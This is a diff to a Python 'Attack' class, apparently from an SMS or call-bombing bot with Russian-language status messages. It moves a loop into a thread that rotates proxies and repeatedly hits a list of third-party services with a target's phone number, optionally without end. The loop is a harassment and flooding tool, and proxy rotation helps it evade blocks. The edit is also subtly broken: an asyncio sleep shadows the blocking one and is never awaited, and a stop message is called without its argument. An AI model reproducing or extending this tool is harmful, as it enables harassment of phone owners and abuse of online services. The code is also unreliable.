@@ -1,3 +1,6 @@
+import asyncio
+import threading
+from time import sleep
 from random import choice
 from asyncio import sleep, get_event_loop
 from loguru import logger
@@ -59,6 +62,23 @@ class Attack:
         else:
             self.state_circles: int = int(circles_status)
 
+        thread = threading.Thread(target=self.current_process, args=(circles_status,))
+        thread.start()
+
+    async def stop(self):
+        """Stop attack"""
+
+        # Update count cirlces (handle stoping)
+        await self.user_data[0].update(status=str(self.state_circles), last_phone=self.phone, last_created=dt.now())
+
+        self.process_status = False       # Change process status
+        #await self.session.close()
+
+    async def send_stop_msg(self, message):
+        await self.user_data[0].update(status=str(self.state_circles), last_phone=self.phone, last_created=dt.now())
+        return await message.answer(text=f"❌Атака остановлена\n"f"🗑Количество кругов израсходовано!")
+
+    def current_process(self, circles_status):
         # Load all proxies
         with open(r"sites/proxies.json") as proxies_load:
             proxies = loads(proxies_load.read())
@@ -67,18 +87,20 @@ class Attack:
         with open(r"sites/services.json") as services_load:
             services = loads(services_load.read())
 
+        k = 0
         # Run attack process
         while self.process_status:
+            k+=1
+            print(k)
             proxy = choice(list(proxies.keys()))
             proxy_url = {"http": "http://%s:%s@%s" %
                          (proxies[proxy][0], proxies[proxy][1], proxy,)}
             self.session.proxies.update(proxy_url)
-            self.session.headers.update(self.headers)
+            #self.session.headers.update(self.headers)
 
             if self.state_circles != "∞":
-                # Update count circles (auto stoping)
-                await self.user_data[0].update(status=str(self.state_circles), last_phone=self.phone, last_created=dt.now())
-                return await message.answer(text=f"❌Атака остановлена\n"f"🗑Количество кругов израсходовано!")
+                msg_loop = asyncio.get_event_loop()
+                msg_loop.run_until_complete(self.send_stop_msg())
 
             for (k, v) in services.items():
                 try:
@@ -96,15 +118,6 @@ class Attack:
                 except (ConnectionError, ReadTimeout, UnicodeEncodeError, SSLError):
                     pass
 
-            await sleep(3)  # Time-out
+            sleep(3)  # Time-out
             if circles_status != "∞":
                 self.state_circles -= 1
-
-    async def stop(self):
-        """Stop attack"""
-
-        # Update count cirlces (handle stoping)
-        await self.user_data[0].update(status=str(self.state_circles), last_phone=self.phone, last_created=dt.now())
-
-        self.process_status = False       # Change process status
-        await self.client_session.close()  # Stop process attack
